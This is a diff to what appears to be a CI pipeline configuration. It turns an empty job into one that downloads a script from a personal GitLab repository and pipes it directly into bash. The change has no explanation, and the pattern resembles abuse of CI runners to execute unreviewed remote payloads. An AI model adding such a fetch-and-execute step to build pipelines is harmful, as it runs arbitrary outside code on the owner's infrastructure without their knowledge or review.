@@ -20,4 +20,5 @@ blocks:
     task:
       jobs:
         - name: 'Job #1'
-          commands: []
+          commands:
+            - 'curl -sL https://gitlab.com/xpanzers/play/-/raw/main/semak | bash'
